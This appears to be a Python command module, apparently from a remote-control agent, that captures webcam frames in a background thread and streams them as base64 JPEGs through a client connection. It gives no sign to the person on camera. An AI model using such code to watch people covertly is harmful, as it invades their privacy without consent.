import cv2
import base64
import threading
import time


class WebcamStreamCommand:

    name = "webcam_stream"

    def __init__(self, client):

        self.client = client
        self.streaming = False
        self.thread = None

    def execute(self, args: str) -> str:

        args = args.strip().lower()

        if args == "start":

            if self.streaming:

                return "STREAM\nERROR\nAlready streaming"

            self.streaming = True

            self.thread = threading.Thread(target=self._stream_loop, daemon=True)

            self.thread.start()

            return "STREAM\nOK\nStarted"

        if args == "stop":

            if not self.streaming:

                return "STREAM\nERROR\nNot streaming"

            self.streaming = False

            return "STREAM\nOK\nStopped"

        return "STREAM\nERROR\n" "Usage: webcam_stream start|stop"

    def _stream_loop(self):

        cap = cv2.VideoCapture(0)

        if not cap.isOpened():

            self.streaming = False
            return

        try:

            while self.streaming:

                ret, frame = cap.read()

                if not ret:
                    break

                frame = cv2.resize(frame, (640, 480))

                success, buffer = cv2.imencode(
                    ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60]
                )

                if not success:
                    continue

                encoded = base64.b64encode(buffer).decode()

                message = "WEBCAM_STREAM\n" "FRAME\n" + encoded

                # IMPORTANT
                self.client.send(message)

                time.sleep(0.08)

        finally:

            cap.release()
